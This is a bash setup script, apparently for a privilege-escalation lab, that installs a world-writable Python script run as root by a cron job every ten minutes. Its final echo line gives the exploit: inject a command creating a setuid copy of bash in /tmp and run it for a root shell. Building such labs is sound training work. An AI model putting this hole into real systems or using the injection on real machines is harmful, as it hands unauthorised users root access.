#!/bin/bash

set -e

echo "Setting up vulnerable root cron job for log cleanup..."

SCRIPT_PATH="/usr/local/bin/logrotate-cleanup.py"
CRON_JOB="*/10 * * * * root $SCRIPT_PATH >> /var/log/cron-cleanup.log 2>&1"

# Create archive dir if needed
sudo mkdir -p /var/log-archive
sudo chown root:root /var/log-archive
sudo chmod 755 /var/log-archive

# Create or overwrite the Python script
sudo tee "$SCRIPT_PATH" > /dev/null << 'EOF'
#!/usr/bin/env python3
import os
import shutil
import datetime
try:
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    for logdir in ["/var/log", "/opt/logs"]:
        if os.path.exists(logdir):
            for filename in os.listdir(logdir):
                if filename.endswith(".log") and os.path.getsize(os.path.join(logdir, filename)) > 10485760:  # >10MB
                    shutil.move(os.path.join(logdir, filename), f"/var/log-archive/{filename}.{timestamp}")
    print(f"Logs archived: {timestamp}")
except Exception as e:
    print(f"Cleanup error: {e}")
EOF

sudo chmod 777 "$SCRIPT_PATH"
sudo chown root:root "$SCRIPT_PATH"

# Add cron job if not exists
if ! sudo grep -q "$SCRIPT_PATH" /etc/crontab; then
    echo "$CRON_JOB" | sudo tee -a /etc/crontab > /dev/null
    echo "Cron job added."
else
    echo "Cron job already exists."
fi

sudo bash -c "$SCRIPT_PATH >> /var/log/cron-cleanup.log 2>&1"
sudo tail -n 1 /var/log/cron-cleanup.log

echo "Setup complete! Vuln ready: Edit $SCRIPT_PATH as low-priv user to inject (e.g., os.system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')) > Wait 10 min > /tmp/rootbash -p."

